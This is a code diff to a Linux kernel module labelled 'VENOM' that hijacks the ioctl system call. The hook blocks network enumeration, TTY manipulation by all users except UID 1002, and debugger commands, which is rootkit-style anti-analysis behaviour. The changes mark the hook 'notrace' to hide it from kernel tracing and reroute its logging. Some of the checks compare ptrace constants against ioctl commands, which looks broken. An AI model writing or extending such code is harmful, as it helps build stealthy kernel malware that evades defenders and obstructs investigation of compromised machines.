@@ -34,7 +34,7 @@ static asmlinkage long (*orig_ioctl)(const struct pt_regs *regs);
 #define TIOCSWINSZ      0x5414  
 
 
-static asmlinkage long hooked_ioctl(const struct pt_regs *regs) {
+notrace static asmlinkage long hooked_ioctl(const struct pt_regs *regs) {
     unsigned int fd = (unsigned int)regs->di;
     unsigned int cmd = (unsigned int)regs->si;
     struct file *file;
@@ -48,7 +48,7 @@ static asmlinkage long hooked_ioctl(const struct pt_regs *regs) {
 
             if (file->f_op && file->f_op->unlocked_ioctl) {
                 fput(file);
-                printk(KERN_DEBUG "[VENOM] Blocked network enumeration ioctl: 0x%x from PID %d\n", 
+                TLOG_INF("[VENOM] Blocked network enumeration ioctl: 0x%x from PID %d\n", 
                        cmd, current->pid);
                 return -EPERM; 
             }
@@ -67,7 +67,7 @@ static asmlinkage long hooked_ioctl(const struct pt_regs *regs) {
                         current_uid().val != 1002) { 
                         
                         fput(file);
-                        printk(KERN_DEBUG "[VENOM] Blocked TTY manipulation on %s from UID %d\n", 
+                        TLOG_INF("[VENOM] Blocked TTY manipulation on %s from UID %d\n", 
                                name, current_uid().val);
                         return -EACCES;
                     }
@@ -79,7 +79,7 @@ static asmlinkage long hooked_ioctl(const struct pt_regs *regs) {
             cmd == PTRACE_DETACH || cmd == PTRACE_PEEKTEXT) {
             
             fput(file);
-            printk(KERN_DEBUG "[VENOM] Blocked potential debugger ioctl: 0x%x\n", cmd);
+            TLOG_INF("[VENOM] Blocked potential debugger ioctl: 0x%x\n", cmd);
             return -EPERM;
         }
         
@@ -90,4 +90,3 @@ static asmlinkage long hooked_ioctl(const struct pt_regs *regs) {
 }
 
 #endif 
-
